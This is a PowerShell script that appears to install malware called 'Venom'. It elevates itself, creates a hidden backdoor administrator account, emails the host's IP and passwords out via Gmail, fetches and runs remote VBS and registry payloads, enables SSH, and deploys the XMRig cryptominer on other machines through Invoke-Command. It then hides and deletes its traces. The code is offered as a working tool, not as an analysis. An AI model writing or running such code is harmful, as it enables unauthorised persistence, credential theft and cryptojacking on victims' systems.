function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
}

if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Exit
} else {
    # Create a new local admin account
    $username = ".Venom"
    $Password = ConvertTo-SecureString ".V3n0m" -AsPlainText -Force
    New-LocalUser $username -Password $Password -FullName ".Venom" -Description "Local admin account created via PowerShell"
    Add-LocalGroupMember -Group "Administrators" -Member $username
}

$wd = random_text
$path = "$env:temp/$wd"
$INITIALPATH = Get-Location

$email = Get-Content PkUbTvqXFIdB.txt
$password = Get-Content NzKnmxLrbsBw.txt

$InterfaceAlias = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }).InterfaceAlias

$IP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $InterfaceAlias).IPAddress >> ip.txt

$configfile = "$env:UserName.rat"

Set-Content -path $configfile -Value ""

Add-Content -path $configfile -Value $IP
Add-Content -path $configfile -Value $Password
Add-Content -path $configfile -Value $path

$Password = ConvertTo-SecureString $password -AsPlainText -Force
$plainPassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($Password))
Add-Content -path $configfile -Value $plainPassword

Add-Content -path $configfile -Value $path

Send-MailMessage `
    -From $email `
    -To $email `
    -Subject "IP Address Notification from $env:UserName" `
    -Attachment $configfile `
    -SmtpServer "smtp.gmail.com" `
    -Port 587 `
    -UseSsl `
    -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $plainPassword -AsPlainText -Force))

Copy-Item -Path "$INITIALPATH\ip.txt" -Destination $path

Remove-Item $configfile

mkdir $path
cd $path

Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wrev.reg -OutFile "QyjAaZDBbNPk.reg"

Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/calty.vbs -OutFile "FoRAUwtxKkSB.vbs"

Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/config.json -OutFile "config.json"

Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/RunHidden.vbs -OutFile "ZDaFvwjOosKx.vbs"

#Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/Ips.txt -OutFile "Ips.txt"


Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*

./QyjAaZDBbNPk.reg; ./FoRAUwtxKkSB.vbs

mv $path\ZDaFvwjOosKx.vbs $INITIALPATH

Start-Sleep -Seconds 30

New-Item -Name "$wd" -path "$path" -ItemType Directory
cd $wd

$currentDir = $Pwd

Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -OutFile "xmrig-6.22.2-msvc-win64.zip"

Expand-Archive -path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -Destinationpath "$currentDir"

Get-ChildItem -path $currentDir

$newConfigpath = "$path\config.json"
$targetConfigpath = "$currentDir\xmrig-6.22.2\config.json"

if (Test-path -path $newConfigpath) {
    Copy-Item -path $newConfigpath -Destination $targetConfigpath -Force
    Write-Output "Config.json file has been replaced successfully."
} else {
    Write-Output "New config.json file not found at the specified path."
}

# Define the path to the text file with IP addresses
$ipFile = "$path\ip.txt"

# Define the path to XMRig executable
$xmrpath = "$currentDir\xmrig.exe"

# Define the configuration file path
$configpath = "$currentDir\config.json"

# Send the email with Rig Status
Send-MailMessage `
    -From $email `
    -To $email `
    -Subject "XMRig Execution Status from $env:UserName" `
    -Body "Xmrig Process Starting..." `
    -SmtpServer "smtp.gmail.com" `
    -Port 587 `
    -UseSsl `
    -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $password -AsPlainText -Force))

# Read the IP addresses from the text file

$ips = Get-Content -path $ipFile

for ($ip in $ips) {
    try {
        Write-Output "Processing IP: $ip"
        
        # Command to start XMRig with the configuration file
        $command = "$xmrpath -c $configpath"

        # Execute the command on the remote computer with elevated privileges
        Invoke-Command -ComputerName $ip -ScriptBlock {
            param($command)
            Start-Process -Filepath "PowerShell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $command" -Verb RunAs
        } -ArgumentList $command

        Write-Output "XMRig started on IP: $ip"
        Send-MailMessage `
            -From $email `
            -To $email `
            -Subject "XMRig Execution Success" `
            -Body "XMRig has successfully started on IP: $ip" `
            -SmtpServer "smtp.gmail.com" `
            -Port 587 `
            -UseSsl `
            -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $password -AsPlainText -Force))
    } catch {
        Write-Output "Error processing IP: $ip"
        Send-MailMessage `
            -From $email `
            -To $email `
            -Subject "XMRig Execution Failure" `
            -Body "Failed to start XMRig on IP: $ip" `
            -SmtpServer "smtp.gmail.com" `
            -Port 587 `
            -UseSsl `
            -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $password -AsPlainText -Force))
    }
}

Write-Output "Script execution completed"
Send-MailMessage `
    -From $email `
    -To $email `
    -Subject "Script Execution Completed" `
    -Body "The script has finished executing. Please check the status of each IP address." `
    -SmtpServer "smtp.gmail.com" `
    -Port 587 `
    -UseSsl `
    -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $password -AsPlainText -Force))


Remove-Item ip.txt


# hide venom user
# Navigate to the C:\Users directory
Set-Location -path 'C:\Users'

# Check if .Venom directory exists
if (Test-path -path '.Venom' -pathType Container) {
    # Set hidden, system, and read-only attributes to .Venom
    attrib +h +s +r .Venom
    Write-Output ".Venom directory attributes set to hidden, system, and read-only"
} else {
    Write-Output ".Venom directory does not exist"
    exit 1
}

# start rig
#powershell -windowstyle hidden -ExecutionPolicy Bypass ./start.cmd
cd $path

Remove-Item config.json
Remove-Item QyjAaZDBbNPk.reg 
Remove-Item FoRAUwtxKkSB.vbs

cd $INITIALPATH

Start-Process "cscript.exe" "ZDaFvwjOosKx.vbs"

Start-Sleep -Seconds 200

del installer.ps1

